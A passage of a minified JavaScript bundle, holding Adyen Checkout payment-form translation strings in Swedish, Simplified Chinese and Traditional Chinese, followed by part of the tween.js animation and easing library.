godkännande krävs för att auktorisera autogiro från detta konto.",edit:"Redigera","bacs.confirm":"Bekräfta och betala","bacs.result.introduction":"Ladda ner din instruktion för autogiro/direktdebitering (DDI / Mandate)","download.pdf":"Ladda ner PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe för säkrat kortnummer","creditCard.encryptedCardNumber.aria.label":"Fält för kortnummer","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe för säkrat utgångsdatum för kort","creditCard.encryptedExpiryDate.aria.label":"Fält för utgångsdatum","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe för säkrad utgångsmånad för kort","creditCard.encryptedExpiryMonth.aria.label":"Fält för utgångsmånad","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe för säkrat utgångsår för kort","creditCard.encryptedExpiryYear.aria.label":"Fält för utgångsår","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe för säkrad säkerhetskod för kort","creditCard.encryptedSecurityCode.aria.label":"Fält för säkerhetskod","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe för säkrat presentkortsnummer","giftcard.encryptedCardNumber.aria.label":"Fält för presentkortsnummer","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe för säkrad säkerhetskod för presentkort","giftcard.encryptedSecurityCode.aria.label":"Fält för säkerhetskod för presentkort",giftcardTransactionLimit:"Maximalt %{amount} per transaktion är tillåtet på detta presentkort","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe för säkrat bankkontonummer","ach.encryptedBankAccountNumber.aria.label":"Fält för bankkontonummer","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe för säkrat clearingnummer","ach.encryptedBankLocationId.aria.label":"Fält för clearingnummer"}}),sg=Object.freeze({__proto__:null,default:{payButton:"支付","payButton.redirecting":"正在重定向...",storeDetails:"保存以便下次支付使用","creditCard.holderName":"卡片上的姓名","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"无效的持卡人姓名","creditCard.numberField.title":"卡号","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"有效期","creditCard.expiryDateField.placeholder":"月月/年年","creditCard.expiryDateField.month":"月","creditCard.expiryDateField.month.placeholder":"月月","creditCard.expiryDateField.year.placeholder":"年年","creditCard.expiryDateField.year":"年","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"记住以便下次使用","creditCard.cvcField.placeholder.4digits":"4 位数","creditCard.cvcField.placeholder.3digits":"3 位数","creditCard.taxNumber.placeholder":"年月日 / 0123456789",installments:"分期付款期数",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} 个月","installments.oneTime":"全款支付","installments.installments":"分期支付","installments.revolving":"循环支付","sepaDirectDebit.ibanField.invalid":"无效的账号","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"持卡人姓名","sepa.ibanNumber":"账号 (IBAN)","error.title":"错误","error.subtitle.redirect":"重定向失败","error.subtitle.payment":"支付失败","error.subtitle.refused":"支付被拒","error.message.unknown":"发生未知错误","idealIssuer.selectField.title":"银行","idealIssuer.selectField.placeholder":"选择您的银行","creditCard.success":"支付成功",loading:"正在加载...",continue:"继续",continueTo:"继续至","wechatpay.timetopay":"您需要支付 %@","wechatpay.scanqrcode":"扫描二维码",personalDetails:"个人详细信息",companyDetails:"公司详情","companyDetails.name":"公司名称","companyDetails.registrationNumber":"注册号",socialSecurityNumber:"社会保险号码",firstName:"名字",infix:"前缀",lastName:"姓氏",mobileNumber:"手机号","mobileNumber.invalid":"无效的手机号码",city:"城市",postalCode:"邮政编码",countryCode:"国家代码",telephoneNumber:"电话号码",dateOfBirth:"出生日期",shopperEmail:"电子邮件地址",gender:"性别",male:"男",female:"女",billingAddress:"账单地址",street:"街道",stateOrProvince:"州或省",country:"国家/地区",houseNumberOrName:"门牌号",separateDeliveryAddress:"指定一个单独的寄送地址",deliveryAddress:"寄送地址",zipCode:"邮政编码",apartmentSuite:"公寓 / 套房",provinceOrTerritory:"省或地区",cityTown:"市 / 镇",address:"地址",state:"州","field.title.optional":"（可选）","creditCard.cvcField.title.optional":"CVC / CVV（可选）","issuerList.wallet.placeholder":"选择您的钱包",privacyPolicy:"隐私政策","afterPay.agreement":"我同意 AfterPay 的 %@",paymentConditions:"支付条件",openApp:"打开应用","voucher.readInstructions":"阅读说明","voucher.introduction":"感谢您的购买，请使用以下优惠券完成支付。","voucher.expirationDate":"有效期","voucher.alternativeReference":"备选代码","dragonpay.voucher.non.bank.selectField.placeholder":"选择您的提供商","dragonpay.voucher.bank.selectField.placeholder":"选择您的银行","voucher.paymentReferenceLabel":"交易号","voucher.surcharge":"包括 %@ 的附加费","voucher.introduction.doku":"感谢您的购买，请使用以下信息完成支付。","voucher.shopperName":"顾客姓名","voucher.merchantName":"商户","voucher.introduction.econtext":"感谢您的购买，请使用以下信息完成支付。","voucher.telephoneNumber":"电话号码","voucher.shopperReference":"顾客参考","voucher.collectionInstitutionNumber":"收款机构编号","voucher.econtext.telephoneNumber.invalid":"电话号码必须为 10 或 11 位数字","boletobancario.btnLabel":"生成 Boleto","boleto.sendCopyToEmail":"将副本发送到我的电子邮箱","button.copy":"复制","button.download":"下载","creditCard.storedCard.description.ariaLabel":"存储的卡片以 ％@ 结尾","voucher.entity":"实体",donateButton:"捐赠",notNowButton:"暂不",thanksForYourSupport:"感谢您的支持！",preauthorizeWith:"预先授权",confirmPreauthorization:"确认预先授权",confirmPurchase:"确认购买",applyGiftcard:"兑换",giftcardBalance:"礼品卡余额",deductedBalance:"扣减余额","creditCard.pin.title":"Pin","creditCard.encryptedPassword.label":"卡片密码的前 2 位数","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"无效的密码","creditCard.taxNumber.label":"持卡人生日 (YYMMDD) 或公司注册号（10 位数）","creditCard.taxNumber.labelAlt":"公司注册号（10 位数）","creditCard.taxNumber.invalid":"无效的持卡人生日或公司注册号","storedPaymentMethod.disable.button":"删除","storedPaymentMethod.disable.confirmation":"删除存储的支付方式","storedPaymentMethod.disable.confirmButton":"是，删除","storedPaymentMethod.disable.cancelButton":"取消","ach.bankAccount":"银行账户","ach.accountHolderNameField.title":"账户持有人姓名","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"无效的账户持有人姓名","ach.accountNumberField.title":"账号","ach.accountNumberField.invalid":"无效的账号","ach.accountLocationField.title":"ABA 路由电汇编码","ach.accountLocationField.invalid":"无效的 ABA 路由电汇编码","select.state":"选择州","select.stateOrProvince":"选择州或省","select.provinceOrTerritory":"选择省或地区","select.country":"选择国家/地区","select.noOptionsFound":"未找到任何选项","select.filter.placeholder":"搜索……","telephoneNumber.invalid":"无效的电话号码",qrCodeOrApp:"或者","paypal.processingPayment":"正在处理付款...",generateQRCode:"生成二维码","await.waitForConfirmation":"等待确认","mbway.confirmPayment":"在 MB WAY 应用上确认您的付款","shopperEmail.invalid":"无效的邮件地址","dateOfBirth.format":"DD/MM/YYYY","dateOfBirth.invalid":"您必须年满 18 周岁","blik.confirmPayment":"打开您的银行应用以确认支付。","blik.invalid":"输入 6 位数","blik.code":"6 位数代码","blik.help":"从您的银行应用中获取代码。","swish.pendingMessage":"扫描后，状态可能会保持最多 10 分钟。在此时间内再次尝试付款可能会导致多次收费。","error.va.gen.01":"不完整字段","error.va.gen.02":"无效字段","error.va.sf-cc-num.01":"无效的卡号","error.va.sf-cc-num.03":"不支持输入的卡片","error.va.sf-cc-dat.01":"卡片太旧","error.va.sf-cc-dat.02":"日期太久远","error.va.sf-cc-dat.03":"您的卡在结账日期前已过期","error.giftcard.no-balance":"礼品卡余额为零","error.giftcard.card-error":"我们的数据库中没有这个号码的礼品卡","error.giftcard.currency-error":"礼品卡仅以其发行的货币为有效货币","amazonpay.signout":"退出 Amazon","amazonpay.changePaymentDetails":"更改支付详情","partialPayment.warning":"请选择其他支付方式支付剩余款项","partialPayment.remainingBalance":"剩余额度为 %{amount}","bankTransfer.beneficiary":"收款人","bankTransfer.iban":"IBAN","bankTransfer.bic":"中国工商银行","bankTransfer.reference":"参考","bankTransfer.introduction":"继续新建银行转账付款。您可以使用以下屏幕中的详细信息来完成这笔付款。","bankTransfer.instructions":"感谢您的购买，请使用以下信息完成支付。","bacs.accountHolderName":"银行账户持有人姓名","bacs.accountHolderName.invalid":"无效的银行账户持有人姓名","bacs.accountNumber":"银行账号","bacs.accountNumber.invalid":"无效的银行账号","bacs.bankLocationId":"分类代码","bacs.bankLocationId.invalid":"无效的分类代码","bacs.consent.amount":"我同意从银行账户中扣除上述金额。","bacs.consent.account":"我确认该账户为我名下的账户，并且我是授权该账户直接借记的唯一签署人。",edit:"编辑","bacs.confirm":"确认并支付","bacs.result.introduction":"下载您的直接借记指示（DDI/委托）","download.pdf":"下载 PDF 文件","creditCard.encryptedCardNumber.aria.iframeTitle":"安全卡号 Iframe","creditCard.encryptedCardNumber.aria.label":"卡号字段","creditCard.encryptedExpiryDate.aria.iframeTitle":"安全卡片过期日期 Iframe","creditCard.encryptedExpiryDate.aria.label":"过期日期字段","creditCard.encryptedExpiryMonth.aria.iframeTitle":"安全卡片过期月份 Iframe","creditCard.encryptedExpiryMonth.aria.label":"过期月份字段","creditCard.encryptedExpiryYear.aria.iframeTitle":"安全卡片过期年份 Iframe","creditCard.encryptedExpiryYear.aria.label":"过期年份字段","creditCard.encryptedSecurityCode.aria.iframeTitle":"安全卡片安全码 Iframe","creditCard.encryptedSecurityCode.aria.label":"安全码字段","giftcard.encryptedCardNumber.aria.iframeTitle":"安全礼品卡号 Iframe","giftcard.encryptedCardNumber.aria.label":"礼品卡号字段","giftcard.encryptedSecurityCode.aria.iframeTitle":"安全礼品卡安全码 Iframe","giftcard.encryptedSecurityCode.aria.label":"礼品卡安全码字段",giftcardTransactionLimit:"此礼品卡上每笔交易允许的最大金额为 %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"安全银行账号 Iframe","ach.encryptedBankAccountNumber.aria.label":"银行账号字段","ach.encryptedBankLocationId.aria.iframeTitle":"安全银行路由电汇编码 Iframe","ach.encryptedBankLocationId.aria.label":"银行路由电汇编码字段"}}),lg=Object.freeze({__proto__:null,default:{payButton:"支付","payButton.redirecting":"重新導向中......",storeDetails:"儲存以供下次付款使用","creditCard.holderName":"信用卡上的姓名","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"持卡人姓名無效","creditCard.numberField.title":"信用卡號碼","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"到期日期","creditCard.expiryDateField.placeholder":"MM/YY","creditCard.expiryDateField.month":"月份","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"YY","creditCard.expiryDateField.year":"年份","creditCard.cvcField.title":"信用卡驗證碼 / 信用卡安全碼","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"記住供下次使用","creditCard.cvcField.placeholder.4digits":"4 位數","creditCard.cvcField.placeholder.3digits":"3 位數","creditCard.taxNumber.placeholder":"年月日／0123456789",installments:"分期付款的期數",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"％{times} 個月","installments.oneTime":"一次性付款","installments.installments":"分期付款","installments.revolving":"延期付款","sepaDirectDebit.ibanField.invalid":"帳戶號碼無效","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"持有人名稱","sepa.ibanNumber":"帳戶號碼 (IBAN)","error.title":"錯誤","error.subtitle.redirect":"無法重新導向","error.subtitle.payment":"付款失敗","error.subtitle.refused":"付款遭拒絕","error.message.unknown":"發生未知錯誤","idealIssuer.selectField.title":"銀行","idealIssuer.selectField.placeholder":"選取您的銀行","creditCard.success":"付款成功",loading:"正在載入...",continue:"繼續",continueTo:"繼續前往","wechatpay.timetopay":"您有 %@ 可以支付","wechatpay.scanqrcode":"掃描 QR 代碼",personalDetails:"個人詳細資料",companyDetails:"公司詳情","companyDetails.name":"公司名稱","companyDetails.registrationNumber":"註冊號碼",socialSecurityNumber:"社會安全碼",firstName:"名字",infix:"前綴",lastName:"姓氏",mobileNumber:"行動電話號碼","mobileNumber.invalid":"手機號碼無效",city:"城市",postalCode:"郵遞區號",countryCode:"國家代碼",telephoneNumber:"電話號碼",dateOfBirth:"出生日期",shopperEmail:"電子郵件地址",gender:"性別",male:"男",female:"女",billingAddress:"帳單地址",street:"街道",stateOrProvince:"州/縣/市",country:"國家/地區",houseNumberOrName:"門牌號",separateDeliveryAddress:"指定另一個派送地址",deliveryAddress:"派送地址",zipCode:"郵遞區號",apartmentSuite:"公寓／套房",provinceOrTerritory:"省或地區",cityTown:"市／鎮",address:"地址",state:"州","field.title.optional":"（選用）","creditCard.cvcField.title.optional":"CVC / CVV (可選)","issuerList.wallet.placeholder":"選取您的電子錢包",privacyPolicy:"隱私權政策","afterPay.agreement":"我同意 AfterPay 的%@",paymentConditions:"付款細則",openApp:"開啟應用程式","voucher.readInstructions":"閱覽說明","voucher.introduction":"多謝惠顧，請使用以下優惠券完成付款。","voucher.expirationDate":"到期日期","voucher.alternativeReference":"備選參照","dragonpay.voucher.non.bank.selectField.placeholder":"選擇您的供應商","dragonpay.voucher.bank.selectField.placeholder":"選取您的銀行","voucher.paymentReferenceLabel":"付款參照號碼","voucher.surcharge":"包含 %@ 附加費","voucher.introduction.doku":"多謝惠顧，請使用以下資訊完成付款。","voucher.shopperName":"購物者姓名","voucher.merchantName":"商家","voucher.introduction.econtext":"多謝惠顧，請使用以下資訊完成付款。","voucher.telephoneNumber":"電話號碼","voucher.shopperReference":"購物者參考","voucher.collectionInstitutionNumber":"收款機構編號","voucher.econtext.telephoneNumber.invalid":"電話號碼的長度必須為 10 或 11 位數","boletobancario.btnLabel":"產生 Boleto","boleto.sendCopyToEmail":"將複本傳送至我的電子郵件","button.copy":"複製","button.download":"下載","creditCard.storedCard.description.ariaLabel":"已儲存以 %@ 結尾的信用卡","voucher.entity":"實體",donateButton:"捐贈",notNowButton:"稍後再說",thanksForYourSupport:"感謝您的支持！",preauthorizeWith:"透過以下方式進行預先授權：",confirmPreauthorization:"確認預先授權",confirmPurchase:"確認購買",applyGiftcard:"兌換",giftcardBalance:"禮品卡餘額",deductedBalance:"扣除餘額","creditCard.pin.title":"數字密碼","creditCard.encryptedPassword.label":"卡密碼的前 2 位數字","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"密碼無效","creditCard.taxNumber.label":"持卡人生日（年月日）或公司註冊號碼（10 位數）","creditCard.taxNumber.labelAlt":"公司註冊號碼（10 位數）","creditCard.taxNumber.invalid":"持卡人生日或公司註冊號碼無效","storedPaymentMethod.disable.button":"移除","storedPaymentMethod.disable.confirmation":"移除已儲存付款方式","storedPaymentMethod.disable.confirmButton":"是，請移除","storedPaymentMethod.disable.cancelButton":"取消","ach.bankAccount":"銀行帳戶","ach.accountHolderNameField.title":"帳戶持有人姓名","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"帳戶持有人姓名無效","ach.accountNumberField.title":"帳戶號碼","ach.accountNumberField.invalid":"帳戶號碼無效","ach.accountLocationField.title":"ABA 匯款路徑編號","ach.accountLocationField.invalid":"ABA 匯款路徑編號無效","select.state":"選取州","select.stateOrProvince":"選擇州或省","select.provinceOrTerritory":"選取省或地區","select.country":"選擇國家／地區","select.noOptionsFound":"找不到任何選項","select.filter.placeholder":"搜尋……","telephoneNumber.invalid":"電話號碼無效",qrCodeOrApp:"或","paypal.processingPayment":"正在處理付款……",generateQRCode:"產生 QR 代碼","await.waitForConfirmation":"正在等候確認","mbway.confirmPayment":"在 MB WAY 應用程式上確認您的付款","shopperEmail.invalid":"電子郵件地址無效","dateOfBirth.format":"日／月／年","dateOfBirth.invalid":"您必須年滿 18 歲","blik.confirmPayment":"開啟您的銀行應用程式以確認付款。","blik.invalid":"輸入 6 個數字","blik.code":"6 位數代碼","blik.help":"從您的銀行應用程式中獲取代碼。","swish.pendingMessage":"掃描後，該待完成狀態可能持續長達 10 分鐘。試圖在這段時間內再次付款可能會導致多重收費。","error.va.gen.01":"不完整欄位","error.va.gen.02":"欄位無效","error.va.sf-cc-num.01":"信用卡號碼無效","error.va.sf-cc-num.03":"輸入了不支援的卡","error.va.sf-cc-dat.01":"卡太舊","error.va.sf-cc-dat.02":"未來日期距今太久","error.va.sf-cc-dat.03":"您的卡會於付款日期前到期","error.giftcard.no-balance":"此禮品卡的餘額為零","error.giftcard.card-error":"我們的記錄中並沒有這個號碼的禮品卡","error.giftcard.currency-error":"禮品卡只能以其簽發時所使用的貨幣進行結算","amazonpay.signout":"從 Amazon 登出","amazonpay.changePaymentDetails":"變更付款明細","partialPayment.warning":"選取其他付款方式來支付餘額","partialPayment.remainingBalance":"餘額將為 %{amount}","bankTransfer.beneficiary":"受款人","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"參照","bankTransfer.introduction":"繼續建立新的銀行轉帳付款。您可以使用以下螢幕中的詳細資訊來完成此項付款。","bankTransfer.instructions":"多謝惠顧，請使用以下資訊完成付款。","bacs.accountHolderName":"銀行帳戶持有人姓名","bacs.accountHolderName.invalid":"銀行帳戶持有人姓名無效","bacs.accountNumber":"銀行帳戶號碼","bacs.accountNumber.invalid":"銀行帳戶號碼無效","bacs.bankLocationId":"銀行代碼","bacs.bankLocationId.invalid":"銀行代碼無效","bacs.consent.amount":"我同意從我的銀行帳戶扣除上述金額。","bacs.consent.account":"我確認該帳戶以我的名義開設，並且我是授權從該帳戶直接扣款的唯一簽署人。",edit:"編輯","bacs.confirm":"確認並支付","bacs.result.introduction":"下載您的直接扣款指示（DDI／授權）","download.pdf":"下載 PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"安全卡號的 IFrame","creditCard.encryptedCardNumber.aria.label":"卡號欄位","creditCard.encryptedExpiryDate.aria.iframeTitle":"安全卡到期日期的 IFrame","creditCard.encryptedExpiryDate.aria.label":"到期日期欄位","creditCard.encryptedExpiryMonth.aria.iframeTitle":"安全卡到期月份的 IFrame","creditCard.encryptedExpiryMonth.aria.label":"到期月份欄位","creditCard.encryptedExpiryYear.aria.iframeTitle":"安全卡到期年份的 IFrame","creditCard.encryptedExpiryYear.aria.label":"到期年份欄位","creditCard.encryptedSecurityCode.aria.iframeTitle":"安全卡安全碼的 IFrame","creditCard.encryptedSecurityCode.aria.label":"安全碼欄位","giftcard.encryptedCardNumber.aria.iframeTitle":"安全禮品卡號的 IFrame","giftcard.encryptedCardNumber.aria.label":"禮品卡號欄位","giftcard.encryptedSecurityCode.aria.iframeTitle":"安全禮品卡安全碼的 IFrame","giftcard.encryptedSecurityCode.aria.label":"禮品卡安全碼欄位",giftcardTransactionLimit:"此禮品卡每筆交易的金額上限為 %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"安全銀行帳戶號碼的 IFrame","ach.encryptedBankAccountNumber.aria.label":"銀行帳戶欄位","ach.encryptedBankLocationId.aria.iframeTitle":"安全銀行匯款路徑編號的 IFrame","ach.encryptedBankLocationId.aria.label":"銀行匯款路徑編號欄位"}});return Rv},"object"==_typeof2(n)&&void 0!==t?t.exports=i():"function"==typeof define&&define.amd?define(i):(r="undefined"!=typeof globalThis?globalThis:r||self).AdyenCheckout=i()}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],2:[function(e,t,n){(function(e){(function(){Object.defineProperty(n,"__esModule",{value:!0});var t,r={Linear:{None:function(e){return e}},Quadratic:{In:function(e){return e*e},Out:function(e){return e*(2-e)},InOut:function(e){return(e*=2)<1?.5*e*e:-.5*(--e*(e-2)-1)}},Cubic:{In:function(e){return e*e*e},Out:function(e){return--e*e*e+1},InOut:function(e){return(e*=2)<1?.5*e*e*e:.5*((e-=2)*e*e+2)}},Quartic:{In:function(e){return e*e*e*e},Out:function(e){return 1- --e*e*e*e},InOut:function(e){return(e*=2)<1?.5*e*e*e*e:-.5*((e-=2)*e*e*e-2)}},Quintic:{In:function(e){return e*e*e*e*e},Out:function(e){return--e*e*e*e*e+1},InOut:function(e){return(e*=2)<1?.5*e*e*e*e*e:.5*((e-=2)*e*e*e*e+2)}},Sinusoidal:{In:function(e){return 1-Math.cos(e*Math.PI/2)},Out:function(e){return Math.sin(e*Math.PI/2)},InOut:function(e){return.5*(1-Math.cos(Math.PI*e))}},Exponential:{In:function(e){return 0===e?0:Math.pow(1024,e-1)},Out:function(e){return 1===e?1:1-Math.pow(2,-10*e)},InOut:function(e){return 0===e?0:1===e?1:(e*=2)<1?.5*Math.pow(1024,e-1):.5*(2-Math.pow(2,-10*(e-1)))}},Circular:{In:function(e){return 1-Math.sqrt(1-e*e)},Out:function(e){return Math.sqrt(1- --e*e)},InOut:function(e){return(e*=2)<1?-.5*(Math.sqrt(1-e*e)-1):.5*(Math.sqrt(1-(e-=2)*e)+1)}},Elastic:{In:function(e){return 0===e?0:1===e?1:-Math.pow(2,10*(e-1))*Math.sin(5*(e-1.1)*Math.PI)},Out:function(e){return 0===e?0:1===e?1:Math.pow(2,-10*e)*Math.sin(5*(e-.1)*Math.PI)+1},InOut:function(e){return 0===e?0:1===e?1:(e*=2)<1?-.5*Math.pow(2,10*(e-1))*Math.sin(5*(e-1.1)*Math.PI):.5*Math.pow(2,-10*(e-1))*Math.sin(5*(e-1.1)*Math.PI)+1}},Back:{In:function(e){return e*e*(2.70158*e-1.70158)},Out:function(e){return--e*e*(2.70158*e+1.70158)+1},InOut:function(e){var t=2.5949095;return(e*=2)<1?e*e*((t+1)*e-t)*.5:.5*((e-=2)*e*((t+1)*e+t)+2)}},Bounce:{In:function(e){return 1-r.Bounce.Out(1-e)},Out:function(e){return e<1/2.75?7.5625*e*e:e<2/2.75?7.5625*(e-=1.5/2.75)*e+.75:e<2.5/2.75?7.5625*(e-=2.25/2.75)*e+.9375:7.5625*(e-=2.625/2.75)*e+.984375},InOut:function(e){return e<.5?.5*r.Bounce.In(2*e):.5*r.Bounce.Out(2*e-1)+.5}}},i="undefined"==typeof self&&void 0!==e&&e.hrtime?function(){var t=e.hrtime();return 1e3*t[0]+t[1]/1e6}:"undefined"!=typeof self&&void 0!==self.performance&&void 0!==self.performance.now?self.performance.now.bind(self.performance):void 0!==Date.now?Date.now:function(){return(new Date).getTime()},a=function(){function e(){this._tweens={},this._tweensAddedDuringUpdate={}}return e.prototype.getAll=function(){var e=this;return Object.keys(this._tweens).map((function(t){return e._tweens[t]}))},e.prototype.removeAll=function(){this._tweens={}},e.prototype.add=function(e){this._tweens[e.getId()]=e,this._tweensAddedDuringUpdate[e.getId()]=e},e.prototype.remove=function(e){delete this._tweens[e.getId()],delete this._tweensAddedDuringUpdate[e.getId()]},e.prototype.update=function(e,t){void 0===e&&(e=i()),void 0===t&&(t=!1);var n=Object.keys(this._tweens);if(0===n.length)return!1;for(;0<n.length;){this._tweensAddedDuringUpdate={};for(var r=0;r<n.length;r++){var a=this._tweens[n[r]],o=!t;a&&!1===a.update(e,o)&&!t&&delete this._tweens[n[r]]}n=Object.keys(this._tweensAddedDuringUpdate)}return!0},e}(),o={Linear:function(e,t){var n=e.length-1,r=n*t,i=Math.floor(r),a=o.Utils.Linear;return t<0?a(e[0],e[1],r):1<t?a(e[n],e[n-1],n-r):a(e[i],e[n<i+1?n:i+1],r-i)},Bezier:function(e,t){for(var n=0,r=e.length-1,i=Math.pow,a=o.Utils.Bernstein,s=0;s<=r;s++)n+=i(1-t,r-s)*i(t,s)*e[s]*a(r,s);return n},CatmullRom:function(e,t){var n=e.length-1,r=n*t,i=Math.floor(r),a=o.Utils.CatmullRom;return e[0]===e[n]?(t<0&&(i=Math.floor(r=n*(1+t))),a(e[(i-1+n)%n],e[i],e[(i+1)%n],e[(i+2)%n],r-i)):t<0?e[0]-(a(e[0],e[0],e[1],e[1],-r)-e[0]):1<t?e[n]-(a(e[n],e[n],e[n-1],e[n-1],r-n)-e[n]):a(e[i?i-1:0],e[i],e[n<i+1?n:i+1],e[n<i+2?n:i+2],r-i)},Utils:{Linear:function(e,t,n){return(t-e)*n+e},Bernstein:function(e,t){var n=o.Utils.Factorial;return n(e)/n(t)/n(e-t)},Factorial:(t=[1],function(e){var n=1;if(t[e])return t[e];for(var r=e;1<r;r--)n*=r;return t[e]=n}),CatmullRom:function(e,t,n,r,i){var a=.5*(n-e),o=.5*(r-t),s=i*i;return(2*t-2*n+a+o)*(i*s)+(-3*t+3*n-2*a-o)*s+a*i+t}}},s=function(){function e(){}return e.nextId=function(){return e._nextId++},e._nextId=0,e}(),l=new a,c=function(){function e(e,t){void 0===t&&(t=l),this._object=e,this._group=t,this._isPaused=!1,this._pauseStart=0,this._valuesStart={},this._valuesEnd={},this._valuesStartRepeat={},this._duration=1e3,this._initialRepeat=0,this._repeat=0,this._yoyo=!1,this._isPlaying=!1,this._reversed=!1,this._delayTime=0,this._startTime=0,this._easingFunction=r.Linear.None,this._interpolationFunction=o.Linear,this._chainedTweens=[],this._onStartCallbackFired=!1,this._id=s.nextId(),this._isChainStopped=!1,this._goToEnd=!1}return e.prototype.getId=function(){return this._id},e.prototype.isPlaying=function(){return this._isPlaying},e.prototype.isPaused=function(){return this._isPaused},e.prototype.to=function(e,t){return this._valuesEnd=Object.create(e),void 0!==t&&(this._duration=t),this},e.prototype.duration=function(e){return this._duration=e,this},e.prototype.start=function(e){if(this._isPlaying)return this;if(this._group&&this._group.add(this),this._repeat=this._initialRepeat,this._reversed)for(var t in this._reversed=!1,this._valuesStartRepeat)this._swapEndStartRepeatValues(t),this._valuesStart[t]=this._valuesStartRepeat[t];return this._isPlaying=!0,this._isPaused=!1,this._onStartCallbackFired=!1,this._isChainStopped=!1,this._startTime=void 0!==e?"string"==typeof e?i()+parseFloat(e):e:i(),this._startTime+=this._delayTime,this._setupProperties(this._object,this._valuesStart,this._valuesEnd,this._valuesStartRepeat),this},e.prototype._setupProperties=function(e,t,n,r){for(var i in n){var a=e[i],o=Array.isArray(a),s=o?"array":_typeof2(a),l=!o&&Array.isArray(n[i]);if("undefined"!==s&&"function"!==s){if(l){var c=n[i];if(0===c.length)continue;c=c.map(this._handleRelativeValue.bind(this,a)),n[i]=[a].concat(c)}if("object"!==s&&!o||!a||l)void 0===t[i]&&(t[i]=a),o||(t[i]*=1),r[i]=l?n[i].slice().reverse():t[i]||0;else{for(var u in t[i]=o?[]:{},a)t[i][u]=a[u];r[i]=o?[]:{},this._setupProperties(a,t[i],n[i],r[i])}}}},e.prototype.stop=function(){return this._isChainStopped||(this._isChainStopped=!0,this.stopChainedTweens()),this._isPlaying&&(this._group&&this._group.remove(this),this._isPlaying=!1,this._isPaused=!1,this._onStopCallback&&this._onStopCallback(this._object)),this},e.prototype.end=function(){return this._goToEnd=!0,this.update(1/0),this},e.prototype.pause=function(e){return void 0===e&&(e=i()),this._isPaused||!this._isPlaying||(this._isPaused=!0,this._pauseStart=e,this._group&&this._group.remove(this)),this},e.prototype.resume=function(e){return void 0===e&&(e=i()),this._isPaused&&this._isPlaying&&(this._isPaused=!1,this._startTime+=e-this._pauseStart,this._pauseStart=0,this._group&&this._group.add(this)),this},e.prototype.stopChainedTweens=function(){for(var e=0,t=this._chainedTweens.length;e<t;e++)this._chainedTweens[e].stop();return this},e.prototype.group=function(e){return this._group=e,this},e.prototype.delay=function(e){return this._delayTime=e,this},e.prototype.repeat=function(e){return this._initialRepeat=e,this._repeat=e,this},e.prototype.repeatDelay=function(e){return this._repeatDelayTime=e,this},e.prototype.yoyo=function(e){return this._yoyo=e,this},e.prototype.easing=function(e){return this._easingFunction=e,this},e.prototype.interpolation=function(e){return this._interpolationFunction=e,this},e.prototype.chain=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];return this._chainedTweens=e,this},e.prototype.onStart=function(e){return this._onStartCallback=e,this},e.prototype.onUpdate=function(e){return this._onUpdateCallback=e,this},e.prototype.onRepeat=function(e){return this._onRepeatCallback=e,this},e.prototype.onComplete=function(e){return this._onCompleteCallback=e,this},e.prototype.onStop=function(e){return this._onStopCallback=e,this},e.prototype.update=function(e,t){if(void 0===e&&(e=i()),void 0===t&&(t=!0),this._isPaused)return!0;var n,r,a=this._startTime+this._duration;if(!this._goToEnd&&!this._isPlaying){if(a<e)return!1;t&&this.start(e)}if(this._goToEnd=!1,e<this._startTime)return!0;!1===this._onStartCallbackFired&&(this._onStartCallback&&this._onStartCallback(this._object),this._onStartCallbackFired=!0),r=(e-this._startTime)/this._duration,r=0===this._duration||1<r?1:r;var o=this._easingFunction(r);if(this._updateProperties(this._object,this._valuesStart,this._valuesEnd,o),this._onUpdateCallback&&this._onUpdateCallback(this._object,r),1!==r)return!0;if(0<this._repeat){for(n in isFinite(this._repeat)&&this._repeat--,this._valuesStartRepeat)this._yoyo||"string"!=typeof this._valuesEnd[n]||(this._valuesStartRepeat[n]=this._valuesStartRepeat[n]+parseFloat(this._valuesEnd[n])),this._yoyo&&this._swapEndStartRepeatValues(n),this._valuesStart[n]=this._valuesStartRepeat[n];return this._yoyo&&(this._reversed=!this._reversed),void 0!==this._repeatDelayTime?this._startTime=e+this._repeatDelayTime:this._startTime=e+this._delayTime,this._onRepeatCallback&&this._onRepeatCallback(this._object),!0}this._onCompleteCallback&&this._onCompleteCallback(this._object);for(var s=0,l=this._chainedTweens.length;s<l;s++)this._chainedTweens[s].start(this._startTime+this._duration);return this._isPlaying=!1},e.prototype._updateProperties=function(e,t,n,r){for(var i in n)if(void 0!==t[i]){var 